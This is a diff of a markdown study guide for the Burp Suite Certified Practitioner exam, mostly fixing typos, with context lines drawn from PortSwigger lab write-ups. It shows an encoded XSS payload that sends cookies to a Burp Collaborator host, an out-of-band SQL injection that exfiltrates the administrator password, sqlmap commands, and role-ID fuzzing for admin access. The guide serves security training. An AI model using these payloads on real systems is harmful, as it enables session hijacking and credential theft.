@@ -49,7 +49,7 @@ Maybe we can use the acronym BSCP, like OSCP  :)
 
 >In the Search function on webapp a Reflected XSS is identified, then deliver exploit link to victim with cookie stealing payload in hosted **iframe** on exploit server.  
 
->WAF is preventing dangerous search filters and tags, then nypass XSS filters using JavaScript global variables.  
+>WAF is preventing dangerous search filters and tags, then bypass XSS filters using JavaScript global variables.  
 
 [Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
   
@@ -75,7 +75,7 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
   
 ![Burp collaborator receiving request with base64 cookie value from our POC.](xss2.png)  
 
->Hosting the **IFRAME** with eval() and fetch() payload on web exploit server, respectively base64 encoded and URL encoded.  
+>Hosting the **IFRAME** with eval() and fetch() payload on exploit server, respectively base64 encoded and URL encoded.  
 
 ```html
 <iframe src="https://TARGET.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
@@ -293,7 +293,7 @@ x=1
 
 >Access control to the admin interface is based on user roles, and this can lead to IDOR or accessc ontrol security vulnerability.  
 
-<sub>Capture current logged in user email submission request and send to Intruder, then add "roleid":§99§ into the JSON body of the request, and fuzz the possible roleid for administrator access role.</sub>  
+>Capture current logged in user email submission request and send to **Intruder**, then add "roleid":§99§ into the JSON body of the request, and fuzz the possible roleid for administrator access role position.  
 
 ```html
 POST /my-account/change-email HTTP/1.1
@@ -321,25 +321,25 @@ Connection: close
 
 ## SQL Injection Data Exfiltration
 
->Error based or Blind SQL injection vulnerabilities, in application used to perform an SQL query to extract data or login credentials from database for the administrator. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
+>Error based or Blind SQL injection vulnerabilities, in application is used to perform an SQL query to extract data or login credentials from database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
 
-<sub>Adding a double or single quote to web parameters and evaluate the error message response, indicate possible SQL injection point.</sub>  
+>Adding a double or single quote to web parameters and evaluate the error message response, indicate possible SQL injection point.  
 
 [SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
 
 ![Identify the input parameter vulnerable to SQL injection](identify-sqli-parameter.png)  
 
-<sup>Out of band data exfiltration SQL query, tracking cookie Example:</sup>  
+>Out of band data exfiltration SQL query, suck as a tracking cookie.  
 
 ```sql
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```  
 
-<sup>Using SQLMAP to enumerate tracking cookie</sup>
+<sup>Using SQLMAP to enumerate tracking cookie.</sup>  
 
 ```bash
 sqlmap -v -r sqli-blind.txt --batch --random-agent --level=3 --risk=3 -p "TrackingId"
-```
+```  
 
 [PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  
 
@@ -371,11 +371,11 @@ sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "cat
 ![SQLMAP used to dump data from tables](sqlmap-dump-table-data.png)
 
 
-<sub>Alternative SQLMAP if finding a blind boolean based vulnerability, and to speed up process the following command perform an error based technique.</sub>  
+>Use SQLMAP Technique parameter as alternative to a blind boolean based vulnerability, and speed up data exfil process by doing error responses.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
-```
+```  
 
 ## XXE Injections
 
